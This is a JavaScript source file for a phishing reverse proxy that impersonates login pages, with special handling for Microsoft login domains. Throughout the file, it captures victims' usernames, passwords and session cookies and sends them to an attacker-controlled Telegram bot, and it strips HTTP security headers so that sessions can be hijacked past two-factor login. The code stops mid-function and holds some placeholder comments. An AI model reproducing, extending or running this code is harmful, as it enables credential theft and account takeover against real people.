require("dotenv").config();

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");

// Add this near the top of proxy_server.js after the other constants
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
function sendToTelegram(message) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    });

    const options = {
      hostname: "api.telegram.org",
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(postData),
      },
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve(data);
        }
      });
    });

    req.on("error", (error) => {
      console.error("Telegram send failed:", error);
      reject(error);
    });

    req.write(postData);
    req.end();
  });
}

// // Test Telegram connection on startup
// console.log("Testing Telegram connection...");
// sendToTelegram(
//   "🟢 <b>EvilWorker Started!</b>\nBot is now running and monitoring for credentials.",
// )
//   .then(() => console.log("✅ Telegram test message sent!"))
//   .catch((err) => console.error("❌ Telegram test failed:", err.message));

function extractCredentialsFromURL(urlString) {
  try {
    const url = new URL(urlString);
    const params = url.searchParams;
    const credentials = {};

    const passwordParams = ["password", "passwd", "pass", "pwd"];
    const userParams = ["username", "user", "email", "login", "userid"];

    for (const param of passwordParams) {
      if (params.has(param)) {
        credentials.password = params.get(param);
        break;
      }
    }

    for (const param of userParams) {
      if (params.has(param)) {
        credentials.username = params.get(param);
        break;
      }
    }

    return credentials;
  } catch {
    return {};
  }
}

async function sendCookiesToTelegram(cookies, sessionId, targetUrl) {
  if (!cookies || cookies.length === 0) return;

  let message = `🍪 <b>COOKIES EXPORT</b>\n`;
  message += `🌐 <b>Target:</b> ${targetUrl}\n`;
  message += `📋 <b>Session:</b> ${sessionId}\n`;
  message += `<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n`;

  let cookieString = "# Netscape HTTP Cookie File\n";
  cookieString += `# Export for ${targetUrl}\n`;
  cookieString += `# Session: ${sessionId}\n`;
  cookieString += `# Date: ${new Date().toISOString()}\n\n`;

  for (const cookie of cookies) {
    const secure = cookie.secure ? "TRUE" : "FALSE";
    const hostOnly = cookie.hostOnly ? "TRUE" : "FALSE";
    const expires = Math.floor(cookie.expires / 1000) || 0;

    const line = `${cookie.domain}\t${hostOnly}\t${cookie.path}\t${secure}\t${expires}\t${cookie.name}\t${cookie.value}`;
    cookieString += line + "\n";
  }

  message += `<pre>${cookieString}</pre>`;
  await sendToTelegram(message);
}

// Add this call after successful 2FA completion detection
// You'll need to detect when 2FA is completed - look for specific response patterns
const PROXY_ENTRY_POINT =
  "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
  index: "index_smQGUDpTF7PN.html",
  notFound: "404_not_found_lk48ZVr32WvU.html",
  script: "script_Vx9Z6XN5uC3k.js",
};
const PROXY_PATHNAMES = {
  proxy: "/lNv1pC9AWPUY4gbidyBO",
  serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
  script: "/@",
  mutation: "/Mutation_o5y3f4O7jMGW",
  jsCookie: "/JSCookie_6X7dRqLg90mH",
  favicon: "/favicon.ico",
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
  if (!fs.existsSync(LOGS_DIRECTORY)) {
    fs.mkdirSync(LOGS_DIRECTORY);
  }
} catch (error) {
  displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

const VICTIM_SESSIONS = {};

const proxyServer = http.createServer((clientRequest, clientResponse) => {
  const { method, url, headers } = clientRequest;
  const currentSession = getUserSession(headers.cookie);

  if (
    url.startsWith(PROXY_ENTRY_POINT) &&
    url.includes(PHISHED_URL_PARAMETER)
  ) {
    try {
      const phishedURL = new URL(
        decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]),
      );
      let session = currentSession;

      if (!currentSession) {
        const { cookieName, cookieValue } = generateNewSession(phishedURL);
        clientResponse.setHeader(
          "Set-Cookie",
          `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`,
        );
        session = cookieName;
      }
      VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
      VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
      VICTIM_SESSIONS[session].path =
        `${phishedURL.pathname}${phishedURL.search}`;
      VICTIM_SESSIONS[session].port = phishedURL.port;
      VICTIM_SESSIONS[session].host = phishedURL.host;

      clientResponse.writeHead(200, { "Content-Type": "text/html" });
      fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
    } catch (error) {
      displayError("Phishing URL parsing failed", error, url);
      clientResponse.writeHead(404, { "Content-Type": "text/html" });
      fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
    }
  } else if (currentSession || url === PROXY_PATHNAMES.proxy) {
    if (url === PROXY_PATHNAMES.serviceWorker) {
      clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
      fs.createReadStream(url.slice(1)).pipe(clientResponse);
    } else if (url === PROXY_PATHNAMES.favicon) {
      clientResponse.writeHead(301, {
        Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}`,
      });
      clientResponse.end();
    } else {
      let clientRequestBody = [];
      clientRequest
        .on("error", (error) => {
          displayError(
            "Client request body retrieval failed",
            error,
            method,
            url,
          );
        })
        .on("data", (chunk) => {
          clientRequestBody.push(chunk);
        })
        .on("end", () => {
          clientRequestBody = Buffer.concat(clientRequestBody).toString();

          if (!currentSession) {
            if (clientRequestBody) {
              try {
                clientRequestBody = JSON.parse(clientRequestBody);
                const proxyRequestURL = new URL(clientRequestBody.url);
                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                if (
                  proxyRequestURL.hostname === headers.host &&
                  proxyRequestPath.startsWith(PROXY_ENTRY_POINT) &&
                  proxyRequestPath.includes(PHISHED_URL_PARAMETER)
                ) {
                  try {
                    const phishedURL = new URL(
                      decodeURIComponent(
                        proxyRequestPath.match(PHISHED_URL_REGEXP)[0],
                      ),
                    );

                    const { cookieName, cookieValue } =
                      generateNewSession(phishedURL);
                    clientResponse.setHeader(
                      "Set-Cookie",
                      `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`,
                    );

                    VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                    VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                    VICTIM_SESSIONS[cookieName].path =
                      `${phishedURL.pathname}${phishedURL.search}`;
                    VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                    VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                    clientResponse.writeHead(301, {
                      Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}`,
                    });
                    clientResponse.end();
                  } catch (error) {
                    displayError(
                      "Phishing URL parsing failed",
                      error,
                      proxyRequestPath,
                    );
                    clientResponse.writeHead(404, {
                      "Content-Type": "text/html",
                    });
                    fs.createReadStream(PROXY_FILES.notFound).pipe(
                      clientResponse,
                    );
                  }
                } else {
                  clientResponse.writeHead(301, { Location: REDIRECT_URL });
                  clientResponse.end();
                }
              } catch (error) {
                displayError(
                  "Anonymous client request body parsing failed",
                  error,
                  clientRequestBody,
                );
              }
            } else {
              clientResponse.writeHead(301, { Location: REDIRECT_URL });
              clientResponse.end();
            }
          } else {
            let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
            const proxyRequestOptions = {
              hostname: VICTIM_SESSIONS[currentSession].hostname,
              port: VICTIM_SESSIONS[currentSession].port,
              method: method,
              path: VICTIM_SESSIONS[currentSession].path,
              headers: { ...headers },
              rejectUnauthorized: false,
            };
            let isNavigationRequest = false;

            if (clientRequestBody) {
              if (url === PROXY_PATHNAMES.jsCookie) {
                updateCurrentSessionCookies(
                  VICTIM_SESSIONS[currentSession],
                  [clientRequestBody],
                  headers.host,
                  currentSession,
                );
                const validDomains = getValidDomains([
                  headers.host,
                  VICTIM_SESSIONS[currentSession].hostname,
                ]);

                clientResponse.writeHead(200, {
                  "Content-Type": "application/json",
                });
                clientResponse.end(JSON.stringify(validDomains));
                return;
              } else if (url === PROXY_PATHNAMES.proxy) {
                try {
                  clientRequestBody = JSON.parse(clientRequestBody);
                  let proxyRequestURL = new URL(clientRequestBody.url);
                  let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                  if (proxyRequestURL.hostname === headers.host) {
                    if (
                      proxyRequestPath.startsWith(PROXY_ENTRY_POINT) &&
                      proxyRequestPath.includes(PHISHED_URL_PARAMETER)
                    ) {
                      try {
                        const phishedURL = new URL(
                          decodeURIComponent(
                            proxyRequestPath.match(PHISHED_URL_REGEXP)[0],
                          ),
                        );

                        VICTIM_SESSIONS[currentSession].protocol =
                          phishedURL.protocol;
                        VICTIM_SESSIONS[currentSession].hostname =
                          phishedURL.hostname;
                        VICTIM_SESSIONS[currentSession].path =
                          `${phishedURL.pathname}${phishedURL.search}`;
                        VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                        VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                        clientResponse.writeHead(301, {
                          Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}`,
                        });
                        clientResponse.end();
                      } catch (error) {
                        displayError(
                          "Phishing URL parsing failed",
                          error,
                          proxyRequestPath,
                        );
                        clientResponse.writeHead(404, {
                          "Content-Type": "text/html",
                        });
                        fs.createReadStream(PROXY_FILES.notFound).pipe(
                          clientResponse,
                        );
                      }
                      return;
                    } else if (
                      proxyRequestURL.pathname === PROXY_PATHNAMES.script
                    ) {
                      clientResponse.writeHead(200, {
                        "Content-Type": "text/javascript",
                      });
                      fs.createReadStream(PROXY_FILES.script).pipe(
                        clientResponse,
                      );
                      return;
                    } else if (
                      proxyRequestURL.pathname === PROXY_PATHNAMES.mutation
                    ) {
                      try {
                        const phishedURLValue =
                          proxyRequestURL.searchParams.get(
                            PHISHED_URL_PARAMETER,
                          );
                        proxyRequestURL = new URL(
                          decodeURIComponent(phishedURLValue),
                        );
                        proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                      } catch (error) {
                        displayError(
                          "Phishing URL parsing failed",
                          error,
                          proxyRequestPath,
                        );
                        clientResponse.writeHead(404, {
                          "Content-Type": "text/html",
                        });
                        fs.createReadStream(PROXY_FILES.notFound).pipe(
                          clientResponse,
                        );
                        return;
                      }
                    } else if (
                      proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie
                    ) {
                      updateCurrentSessionCookies(
                        VICTIM_SESSIONS[currentSession],
                        [clientRequestBody.body],
                        headers.host,
                        currentSession,
                      );
                      const validDomains = getValidDomains([
                        headers.host,
                        VICTIM_SESSIONS[currentSession].hostname,
                      ]);

                      clientResponse.writeHead(200, {
                        "Content-Type": "application/json",
                      });
                      clientResponse.end(JSON.stringify(validDomains));
                      return;
                    }
                  }
                  proxyRequestProtocol = proxyRequestURL.protocol;
                  proxyRequestOptions.path = proxyRequestPath;
                  proxyRequestOptions.port = proxyRequestURL.port;
                  proxyRequestOptions.method = clientRequestBody.method;

                  proxyRequestOptions.headers = {
                    ...headers,
                    ...clientRequestBody.headers,
                  };
                  if (proxyRequestURL.hostname !== headers.host) {
                    proxyRequestOptions.hostname = proxyRequestURL.hostname;
                    proxyRequestOptions.headers.host = proxyRequestURL.host;
                  }
                  if (proxyRequestOptions.headers.referer) {
                    proxyRequestOptions.headers.referer =
                      clientRequestBody.referrer;
                  }
                  isNavigationRequest = clientRequestBody.mode === "navigate";
                } catch (error) {
                  displayError(
                    "Authenticated client request body parsing failed",
                    error,
                    proxyRequestOptions.host,
                    proxyRequestOptions.path,
                    clientRequestBody,
                  );
                }
              } else {
                console.warn(
                  `/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`,
                );
              }
            } else {
              console.warn(
                `/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`,
              );
            }

            proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(
              headers.host,
              VICTIM_SESSIONS[currentSession].host,
            );
            updateProxyRequestHeaders(
              proxyRequestOptions,
              currentSession,
              headers.host,
            );

            const proxyRequestBody =
              clientRequestBody.body ?? clientRequestBody;
            const requestContentLength = Buffer.byteLength(proxyRequestBody);
            if (requestContentLength) {
              proxyRequestOptions.headers["content-length"] =
                requestContentLength.toString();
            } else {
              delete proxyRequestOptions.headers["content-type"];
              delete proxyRequestOptions.headers["content-length"];
            }

            if (isNavigationRequest) {
              VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
              VICTIM_SESSIONS[currentSession].hostname =
                proxyRequestOptions.hostname;
              VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
              VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
              VICTIM_SESSIONS[currentSession].host =
                proxyRequestOptions.headers.host;
            }

            makeProxyRequest(
              proxyRequestProtocol,
              proxyRequestOptions,
              currentSession,
              headers.host,
              proxyRequestBody,
              clientResponse,
              isNavigationRequest,
            );
            debugSessionState(currentSession);
          }
        });
    }
  } else {
    clientResponse.writeHead(301, { Location: REDIRECT_URL });
    clientResponse.end();
  }
});
proxyServer.listen(process.env.PORT ?? 3000);

const makeProxyRequest = (
  proxyRequestProtocol,
  proxyRequestOptions,
  currentSession,
  proxyHostname,
  proxyRequestBody,
  clientResponse,
  isNavigationRequest,
) => {
  const protocol = proxyRequestProtocol === "https:" ? https : http;

  console.log(
    `[PROXY] ${proxyRequestOptions.method} ${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
  );

  const proxyRequest = protocol.request(
    proxyRequestOptions,
    (proxyResponse) => {
      // Log the response status
      console.log(
        `[PROXY RESPONSE] ${proxyResponse.statusCode} from ${proxyRequestOptions.headers.host}`,
      );

      // 🔥 FIX: Handle cookie updates
      const proxyResponseCookie = proxyResponse.headers["set-cookie"];
      if (proxyResponseCookie) {
        try {
          updateCurrentSessionCookies(
            proxyRequestOptions,
            proxyResponseCookie,
            proxyHostname,
            currentSession,
            proxyResponse.headers.date,
          );
        } catch (cookieError) {
          console.error("[COOKIE ERROR]", cookieError.message);
        }
      }

      // 🔥 FIX: Remove security headers
      proxyResponse.headers["cache-control"] = "no-store";
      proxyResponse.headers["access-control-allow-origin"] =
        `https://${proxyHostname}`;
      deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

      // ... rest of response handling code ...

      let serverResponseBody = [];
      proxyResponse
        .on("error", (error) => {
          console.error("[RESPONSE ERROR]", error.message);
          clientResponse.writeHead(500, { "Content-Type": "text/html" });
          clientResponse.end(
            "<html><body><h1>500 Internal Server Error</h1></body></html>",
          );
        })
        .on("data", (chunk) => {
          serverResponseBody.push(chunk);
        })
        .on("end", async () => {
          try {
            serverResponseBody = Buffer.concat(serverResponseBody);

            // ... existing body processing ...

            clientResponse.writeHead(
              proxyResponse.statusCode,
              proxyResponse.headers,
            );
            clientResponse.end(serverResponseBody);
          } catch (error) {
            console.error("[RESPONSE END ERROR]", error.message);
            clientResponse.writeHead(500, { "Content-Type": "text/html" });
            clientResponse.end(
              "<html><body><h1>500 Internal Server Error</h1></body></html>",
            );
          }
        });
    },
  );

  // 🔥 FIX: Handle request errors
  proxyRequest.on("error", (error) => {
    console.error(`[PROXY ERROR] ${error.code} - ${error.message}`);

    if (error.code === "ENOTFOUND") {
      console.warn(
        `[WARN] DNS resolution failed for ${proxyRequestOptions.hostname}`,
      );
      clientResponse.writeHead(404, { "Content-Type": "text/html" });
      clientResponse.end(
        `<html><body><h1>404 Not Found</h1><p>Could not resolve ${proxyRequestOptions.hostname}</p></body></html>`,
      );
    } else if (error.code === "ECONNREFUSED") {
      console.warn(
        `[WARN] Connection refused for ${proxyRequestOptions.hostname}`,
      );
      clientResponse.writeHead(503, { "Content-Type": "text/html" });
      clientResponse.end(
        "<html><body><h1>503 Service Unavailable</h1></body></html>",
      );
    } else {
      clientResponse.writeHead(500, { "Content-Type": "text/html" });
      clientResponse.end(
        `<html><body><h1>500 Internal Server Error</h1><p>${error.message}</p></body></html>`,
      );
    }
  });

  if (proxyRequestBody) {
    try {
      proxyRequest.write(proxyRequestBody);
    } catch (writeError) {
      console.error("[WRITE ERROR]", writeError.message);
    }
  }
  proxyRequest.end();
};
// Add this after updating cookies in the makeProxyRequest
function debugSessionState(currentSession) {
  const cookies = VICTIM_SESSIONS[currentSession].cookies || [];
  console.log(
    `[SESSION STATE] ${currentSession} has ${cookies.length} cookies`,
  );

  // Log important session cookies
  const importantCookies = cookies.filter(
    (c) => c.name.includes("esctx") || c.name === "fpc" || c.name === "buid",
  );

  for (const cookie of importantCookies) {
    console.log(
      `[SESSION COOKIE] ${cookie.name}=${cookie.value.substring(0, 20)}... domain=${cookie.domain}`,
    );
  }
}

function displayError(message, error, ...args) {
  console.error("******************************");
  console.error(`${message}: ${error.name ?? error}`);
  console.error(`Message: ${error.message}`);
  console.error(`Stack trace: ${error.stack}`);

  for (let i = 0; i < args.length; i++) {
    console.error(`Parameter ${i + 1}: ${args[i]}`);
  }
  console.error("******************************");
}

function getUserSession(requestCookies) {
  if (!requestCookies) return;

  const cookies = requestCookies.split("; ");
  for (const cookie of cookies) {
    const [cookieName, ...cookieValue] = cookie.split("=");

    if (
      VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
      VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")
    ) {
      return cookieName;
    }
  }
  return;
}

function generateRandomString(length) {
  const characters =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  return Array.from(
    { length },
    () => characters[Math.floor(Math.random() * characters.length)],
  ).join("");
}

function createSessionLogFile(logFilename, currentSession) {
  const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
  const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });

  LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
  // const cookieName = generateRandomString(12);
  // const cookieValue = generateRandomString(32);

  const cookieName = `session_${crypto.randomBytes(16).toString("hex")}`;
  const cookieValue = crypto.randomBytes(32).toString("hex");

  VICTIM_SESSIONS[cookieName] = {};
  VICTIM_SESSIONS[cookieName].value = cookieValue;
  VICTIM_SESSIONS[cookieName].cookies = [];
  VICTIM_SESSIONS[cookieName].logFilename =
    `${phishedURL.host}__${new Date().toISOString()}`;
  createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

  return {
    cookieName: cookieName,
    cookieValue: cookieValue,
  };
}

async function encryptData(data) {
  const iv = crypto.randomBytes(16);

  return new Promise((resolve, reject) => {
    const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
    const encryptedData = [];

    cipher
      .on("error", (error) => {
        reject(error);
      })
      .on("data", (chunk) => {
        encryptedData.push(chunk);
      })
      .on("end", () => {
        resolve({
          iv: iv.toString("hex"),
          encryptedData: Buffer.concat(encryptedData).toString("hex"),
        });
      });

    cipher.write(data, "utf-8");
    cipher.end();
  });
}

async function logHTTPProxyTransaction(
  proxyRequestProtocol,
  proxyRequestOptions,
  proxyRequestBody,
  proxyResponse,
  currentSession,
) {
  const httpProxyTransaction = {
    timestamp: new Date().toISOString(),
    proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
    proxyRequestMethod: proxyRequestOptions.method,
    proxyRequestHeaders: proxyRequestOptions.headers,
    proxyRequestBody: proxyRequestBody,
    proxyResponseStatusCode: proxyResponse.statusCode,
    proxyResponseHeaders: proxyResponse.headers,
  };
  const logFileStream = LOG_FILE_STREAMS[currentSession];

  const encryptedResult = await encryptData(
    JSON.stringify(httpProxyTransaction),
  );

  if (
    !logFileStream.write(
      `${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`,
    )
  ) {
    await new Promise((resolve) => logFileStream.once("drain", resolve));
  }

  // --- CREDENTIAL EXTRACTION ---
  try {
    const requestBodyString = proxyRequestBody?.toString() || "";

    // Log for debugging
    if (requestBodyString.length > 0 && requestBodyString.length < 5000) {
      console.log(
        `[DEBUG] Request body: ${requestBodyString.substring(0, 200)}...`,
      );
    }

    let credentials = {};
    let found = false;

    // Try JSON first
    try {
      const parsed = JSON.parse(requestBodyString);
      // Check for nested credentials
      const jsonString = JSON.stringify(parsed).toLowerCase();
      if (
        jsonString.includes("password") ||
        jsonString.includes("passwd") ||
        jsonString.includes("username") ||
        jsonString.includes("email") ||
        jsonString.includes("login") ||
        jsonString.includes("user")
      ) {
        // Look for credential patterns in the JSON
        const passMatch =
          requestBodyString.match(/"password"\s*:\s*"([^"]+)"/i) ||
          requestBodyString.match(/"passwd"\s*:\s*"([^"]+)"/i) ||
          requestBodyString.match(/"pass"\s*:\s*"([^"]+)"/i);
        const userMatch =
          requestBodyString.match(/"username"\s*:\s*"([^"]+)"/i) ||
          requestBodyString.match(/"email"\s*:\s*"([^"]+)"/i) ||
          requestBodyString.match(/"login"\s*:\s*"([^"]+)"/i) ||
          requestBodyString.match(/"user"\s*:\s*"([^"]+)"/i);

        if (passMatch && userMatch) {
          credentials.password = passMatch[1];
          credentials.username = userMatch[1];
          found = true;
        } else if (passMatch) {
          credentials.password = passMatch[1];
          credentials.username = "N/A (not found in JSON)";
          found = true;
        }
      }
    } catch (e) {
      // Not JSON, try form data
    }

    // Try URL-encoded form data
    if (!found) {
      try {
        const params = new URLSearchParams(requestBodyString);
        const hasPassword =
          params.has("password") ||
          params.has("passwd") ||
          params.has("pwd") ||
          params.has("pass");
        const hasUser =
          params.has("username") ||
          params.has("email") ||
          params.has("login") ||
          params.has("user") ||
          params.has("userid");

        if (hasPassword) {
          credentials.password =
            params.get("password") ||
            params.get("passwd") ||
            params.get("pwd") ||
            params.get("pass") ||
            "N/A";
          credentials.username =
            params.get("username") ||
            params.get("email") ||
            params.get("login") ||
            params.get("user") ||
            "N/A";
          found = true;
        }
      } catch (e) {
        // Not form data
      }
    }

    // Try plain text with common patterns
    if (!found) {
      const passPatterns = [
        /password["'\s:=]+([^\s"',&]+)/i,
        /passwd["'\s:=]+([^\s"',&]+)/i,
        /pwd["'\s:=]+([^\s"',&]+)/i,
        /pass["'\s:=]+([^\s"',&]+)/i,
      ];
      const userPatterns = [
        /username["'\s:=]+([^\s"',&]+)/i,
        /email["'\s:=]+([^\s"',&]+)/i,
        /login["'\s:=]+([^\s"',&]+)/i,
        /user["'\s:=]+([^\s"',&]+)/i,
      ];

      for (const pattern of passPatterns) {
        const match = requestBodyString.match(pattern);
        if (match && match[1] && match[1].length > 2) {
          credentials.password = match[1];
          break;
        }
      }

      for (const pattern of userPatterns) {
        const match = requestBodyString.match(pattern);
        if (match && match[1] && match[1].length > 2) {
          credentials.username = match[1];
          break;
        }
      }

      if (credentials.password || credentials.username) {
        found = true;
      }
    }

    if (found && credentials.password && credentials.password !== "N/A") {
      const message = `
🔐 <b>CREDENTIALS CAPTURED!</b>
👤 <b>Username:</b> <code>${credentials.username || "N/A"}</code>
🔑 <b>Password:</b> <code>${credentials.password}</code>
🌐 <b>URL:</b> ${proxyRequestOptions.headers.host}${proxyRequestOptions.path}
🕐 <b>Time:</b> ${new Date().toISOString()}
📋 <b>Session:</b> ${currentSession}
            `;
      console.log("[!] CREDENTIALS FOUND! Sending to Telegram...");
      await sendToTelegram(message);

      // Also log to console for debugging
      console.log(
        `[!] Credentials: ${credentials.username} / ${credentials.password}`,
      );
    }
  } catch (error) {
    console.error("Credential extraction failed:", error);
  }
}

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
  // 🔥 FIX: Special case for Microsoft domains
  if (
    cookieDomain.endsWith(".live.com") ||
    cookieDomain.endsWith(".microsoftonline.com") ||
    cookieDomain === "login.live.com"
  ) {
    // Allow these domains to work across the Microsoft ecosystem
    if (
      requestHostname.endsWith(".live.com") ||
      requestHostname.endsWith(".microsoftonline.com")
    ) {
      return true;
    }
  }

  const splitRequestHostname = requestHostname.split(".");
  const splitCookieDomain = cookieDomain.split(".");

  if (splitCookieDomain.length < 2) {
    return false;
  }

  // 🔥 FIX: For cookieHostOnly, check if the cookie domain is a suffix of request hostname
  if (
    cookieHostOnly &&
    splitRequestHostname.length !== splitCookieDomain.length
  ) {
    const requestSuffix = splitRequestHostname.slice(-splitCookieDomain.length);
    if (requestSuffix.join(".") === cookieDomain) {
      return true;
    }
    return false;
  }

  if (splitRequestHostname.length < splitCookieDomain.length) {
    return false;
  }

  for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
    if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
      return false;
    }
  }
  return true;
}

function isPathApplicable(requestPath, cookiePath) {
  const splitRequestPath = requestPath.split("/");
  const splitCookiePath = cookiePath.split("/");

  if (cookiePath === "/") {
    return true;
  }
  if (splitRequestPath.length < splitCookiePath.length) {
    return false;
  }

  for (let i = 1, l = splitCookiePath.length; i < l; i++) {
    if (splitCookiePath[i] !== splitRequestPath[i]) {
      return false;
    }
  }
  return true;
}

function isCookieApplicable(requestOptions, cookie) {
  return (
    isDomainApplicable(
      requestOptions.hostname,
      cookie.domain,
      cookie.hostOnly,
    ) && isPathApplicable(requestOptions.path, cookie.path)
  );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
  const proxyRequestCookies = {};
  const currentTimestamp = Date.now();

  const allCookies = VICTIM_SESSIONS[currentSession].cookies || [];

  // First, collect all applicable cookies
  const applicableCookies = [];
  for (const cookie of allCookies) {
    if (
      !(currentTimestamp > cookie.expires) &&
      isCookieApplicable(proxyRequestOptions, cookie)
    ) {
      applicableCookies.push(cookie);
    }
  }

  // 🔥 FIX: If there's an esctx variant, use it, but also keep the main esctx
  // The browser sends ALL matching cookies, including both esctx and esctx-*
  for (const cookie of applicableCookies) {
    proxyRequestCookies[cookie.name] = cookie.value;
  }

  return Object.entries(proxyRequestCookies)
    .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
    .join("; ");
}

function parseCookieDate(cookieDate) {
  let foundTime = false;
  let foundDay = false;
  let foundMonth = false;
  let foundYear = false;

  let hourValue, minuteValue, secondValue;
  let dayValue, monthValue, yearValue;

  const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
  const dateTokens = cookieDate.split(delimiterRegex).filter((token) => token);

  for (const token of dateTokens) {
    if (!foundTime) {
      const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

      if (timeMatch) {
        foundTime = true;
        hourValue = parseInt(timeMatch[1]);
        minuteValue = parseInt(timeMatch[2]);
        secondValue = parseInt(timeMatch[3]);
        continue;
      }
    }
    if (!foundDay) {
      const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

      if (dayMatch) {
        foundDay = true;
        dayValue = parseInt(dayMatch[1]);
        continue;
      }
    }
    if (!foundMonth) {
      const monthLowerCase = token.toLowerCase();
      const months = [
        "jan",
        "feb",
        "mar",
        "apr",
        "may",
        "jun",
        "jul",
        "aug",
        "sep",
        "oct",
        "nov",
        "dec",
      ];

      for (let i = 0; i < months.length; i++) {
        if (monthLowerCase.startsWith(months[i])) {
          foundMonth = true;
          monthValue = i;
          break;
        }
      }
      if (foundMonth) continue;
    }
    if (!foundYear) {
      const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);

      if (yearMatch) {
        foundYear = true;
        yearValue = parseInt(yearMatch[1]);
        continue;
      }
    }
  }

  if (yearValue >= 70 && yearValue <= 99) {
    yearValue += 1900;
  } else if (yearValue >= 0 && yearValue <= 69) {
    yearValue += 2000;
  }

  if (!foundDay || !foundMonth || !foundYear || !foundTime) {
    return NaN;
  }
  if (dayValue < 1 || dayValue > 31) {
    return NaN;
  }
  if (yearValue < 1601) {
    return NaN;
  }
  if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
    return NaN;
  }

  const parsedCookieDate = new Date(
    Date.UTC(
      yearValue,
      monthValue,
      dayValue,
      hourValue,
      minuteValue,
      secondValue,
    ),
  );

  if (
    parsedCookieDate.getUTCFullYear() !== yearValue ||
    parsedCookieDate.getUTCMonth() !== monthValue ||
    parsedCookieDate.getUTCDate() !== dayValue
  ) {
    return NaN;
  }
  return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(
  request,
  newCookies,
  proxyHostname,
  currentSession,
  proxyResponseDate = null,
) {
  const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
  const currentTimestamp = Date.now();
  let clockSkew = 0;
  if (proxyResponseDate) {
    clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
  }

  for (const newCookie of newCookies) {
    const [cookie, ...attributes] = newCookie.split(";");
    const [cookieName, ...cookieValue] = cookie.split("=");
    if (!cookieName || cookieName.trim() === "") {
      continue;
    }

